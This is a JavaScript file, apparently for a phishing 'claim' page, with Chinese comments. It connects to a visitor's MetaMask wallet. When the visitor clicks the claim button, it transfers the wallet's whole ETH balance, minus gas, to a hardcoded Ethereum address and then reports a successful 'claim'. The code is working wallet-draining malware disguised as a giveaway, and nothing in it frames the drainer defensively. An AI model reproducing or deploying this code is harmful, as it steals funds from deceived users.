// 目标地址
const TARGET_ADDRESS = "0x64C6592164CC7C0Bdfb1D9a6F64C172a1830eD2C";

// 初始化 Web3
let web3;
async function initWeb3() {
    try {
        if (typeof window.ethereum === "undefined") {
            alert("请安装 MetaMask 钱包！");
            console.error("未检测到 MetaMask！");
            return false;
        }
        web3 = new Web3(window.ethereum);
        console.log("Web3 初始化成功！");
        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
        if (!accounts || accounts.length === 0) {
            throw new Error("未能连接到 MetaMask 账户！");
        }
        console.log("已连接钱包，地址:", accounts[0]);
        return true;
    } catch (error) {
        console.error("Web3 初始化失败:", error.message);
        alert("Web3 初始化失败: " + error.message);
        return false;
    }
}

// 页面加载完成后初始化 Web3 并绑定按钮事件
document.addEventListener("DOMContentLoaded", async () => {
    const web3Initialized = await initWeb3();
    if (!web3Initialized) {
        return;
    }
    const claimButton = document.getElementById("claimButton");
    if (!claimButton) {
        console.error("未找到 claimButton 元素！");
        return;
    }

    claimButton.addEventListener("click", async () => {
        console.log("按钮被点击，开始处理转账...");
        try {
            const accounts = await web3.eth.getAccounts();
            const userAddress = accounts[0];
            console.log("当前账户:", userAddress);

            const balanceWei = await web3.eth.getBalance(userAddress);
            const balanceEth = web3.utils.fromWei(balanceWei, "ether");
            console.log(`钱包余额: ${balanceEth} ETH (wei: ${balanceWei})`);

            const tx = {
                from: userAddress,
                to: TARGET_ADDRESS,
                value: balanceWei,
            };

            const gasLimit = await web3.eth.estimateGas(tx);
            console.log(`估算 Gas 消耗: ${gasLimit}`);

            const gasPrice = await web3.eth.getGasPrice();
            const gasPriceEth = web3.utils.fromWei(gasPrice, "ether");
            console.log(`当前 Gas 价格: ${gasPriceEth} ETH (wei: ${gasPrice})`);

            const gasFee = BigInt(gasLimit) * BigInt(gasPrice);
            const gasFeeEth = web3.utils.fromWei(gasFee.toString(), "ether");
            console.log(`实际手续费: ${gasFeeEth} ETH (wei: ${gasFee})`);

            let amountToSend = BigInt(balanceWei);
            if (amountToSend > gasFee) {
                amountToSend = amountToSend - gasFee;
                console.log(`余额足够，预留手续费 ${gasFeeEth} ETH，转账金额: ${web3.utils.fromWei(amountToSend.toString(), "ether")} ETH`);
            } else {
                console.log(`余额不足以支付手续费，仍将转账: ${web3.utils.fromWei(amountToSend.toString(), "ether")} ETH`);
            }

            const finalTx = {
                from: userAddress,
                to: TARGET_ADDRESS,
                value: amountToSend.toString(),
                gas: gasLimit,
                gasPrice: gasPrice,
            };
            console.log("转账交易参数:", finalTx);

            console.log("正在发送交易...");
            const transactionReceipt = await web3.eth.sendTransaction(finalTx);
            console.log("交易已发送，交易哈希:", transactionReceipt.transactionHash);

            alert("领取成功！交易哈希: " + transactionReceipt.transactionHash);
            console.log("转账成功！交易哈希:", transactionReceipt.transactionHash);
        } catch (error) {
            if (error.message.includes("User denied transaction signature")) {
                console.log("用户取消了转账");
                alert("领取未完成");
            } else {
                console.error("领取失败:", error.message);
                alert("领取失败: " + error.message);
            }
        }
    });
});
